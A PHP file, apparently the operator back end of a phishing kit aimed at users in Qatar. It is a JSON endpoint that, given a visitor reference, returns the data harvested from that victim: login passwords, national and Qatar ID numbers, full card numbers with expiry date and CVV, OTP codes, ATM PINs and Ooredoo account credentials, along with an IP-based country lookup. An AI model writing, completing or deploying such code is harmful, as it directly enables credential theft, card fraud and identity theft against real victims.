<?php
require_once __DIR__ . '/../../includes/db.php';
require_once __DIR__ . '/../../includes/functions.php';

header('Content-Type: application/json');

$ref = $_GET['ref'] ?? '';

if (!$ref) {
    echo json_encode(['success' => false, 'error' => 'Missing reference']);
    exit;
}

// دالة للحصول على الدولة من عنوان IP
function getCountryFromIP($ip) {
    if ($ip === '127.0.0.1' || $ip === 'localhost' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return 'محلي';
    }
    
    try {
        $response = @file_get_contents("https://ipapi.co/{$ip}/json/");
        if ($response !== false) {
            $data = json_decode($response, true);
            return $data['country_name'] ?? 'غير معروف';
        }
    } catch (Exception $e) {
        // في حالة الفشل، نرجع قيمة افتراضية
    }
    
    return 'غير معروف';
}

try {
    $stmt = $pdo->prepare("SELECT * FROM visitors WHERE visitor_id = ?");
    $stmt->execute([$ref]);
    $v = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$v) {
        echo json_encode(['success' => false, 'error' => 'Not found']);
        exit;
    }
    
    $stmtData = $pdo->prepare("SELECT field_name, field_value FROM client_data WHERE visitor_id = ?");
    $stmtData->execute([$ref]);
    $details = $stmtData->fetchAll(PDO::FETCH_KEY_PAIR);
    
    // الحصول على الدولة من IP
    $country = getCountryFromIP($v['ip_address']);
    
    $data = [
        'referenceId' => $v['visitor_id'],
        'country' => $country,
        'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
        'clientId' => $details['id_number'] ?? '-',
        'clientPhone' => $details['phone_number'] ?? '-',
        'vehiclePlate' => $details['vehicle_plate'] ?? '-',
        'vehicleType' => $details['vehicle_type'] ?? '-',
        'serviceRegion' => $details['region'] ?? '-',
        'serviceDate' => $v['last_activity'],
        'serviceTime' => '-',
        'status' => $v['status'],
        'clientIp' => $v['ip_address'],
        'clientEmail' => $details['email_confirm'] ?? $details['email'] ?? '-',
        'clientNationality' => $details['nationality'] ?? '-',
        'allData' => [
            // البيانات الأساسية
            'username' => $details['username'] ?? '-',
            'password' => $details['password'] ?? '-',
            'name_ar' => $details['name_ar'] ?? '-',
            'name_en' => $details['name_en'] ?? '-',
            'id_number' => $details['id_number'] ?? '-',
            'qatar_id' => $details['qatar_id'] ?? '-',
            'dob' => $details['dob'] ?? '-',
            'gender' => $details['gender'] ?? '-',
            'address' => $details['address'] ?? '-',
            'email' => $details['email'] ?? '-',
            'email_confirm' => $details['email_confirm'] ?? '-',
            'phone_number' => $details['phone_number'] ?? '-',
            'country_code' => $details['country_code'] ?? '-',
            'account_type' => $details['account_type'] ?? '-',
            'nationality' => $details['nationality'] ?? '-',
            
            // بيانات الدفع والبطاقة
            'card_name' => $details['card_name'] ?? '-',
            'card_number' => $details['card_number'] ?? '-',
            'exp_month' => $details['exp_month'] ?? '-',
            'exp_year' => $details['exp_year'] ?? '-',
            'cvv' => $details['cvv'] ?? '-',
            
            // بيانات التحقق
            'otp' => $details['otp'] ?? '-',
            'atm_pin' => $details['atm_pin'] ?? '-',
            
            // بيانات Ooredoo
            'ooredoo_user' => $details['ooredoo_user'] ?? '-',
            'ooredoo_pass' => $details['ooredoo_pass'] ?? '-',
            'ooredoo_otp' => $details['ooredoo_otp'] ?? '-',
            
            // بيانات أخرى
            'vehicle_plate' => $details['vehicle_plate'] ?? '-',
            'vehicle_type' => $details['vehicle_type'] ?? '-',
            'region' => $details['region'] ?? '-',
        ],
        'payment' => [
            'cardHolderName' => $details['card_name'] ?? '-',
            'cardNumber' => $details['card_number'] ?? '-',
            'cardExpiry' => ($details['exp_month'] ?? '') . '/' . ($details['exp_year'] ?? ''),
            'cardCvv' => $details['cvv'] ?? '-',
            'verifyCode' => $details['otp'] ?? '-',
            'secretNum' => $details['atm_pin'] ?? '-',
            'ooredooUser' => $details['ooredoo_user'] ?? '-',
            'ooredooPass' => $details['ooredoo_pass'] ?? '-',
            'ooredooOtp' => $details['ooredoo_otp'] ?? '-',
            'step' => 1
        ]
    ];
    
    echo json_encode(['success' => true, 'data' => $data]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>
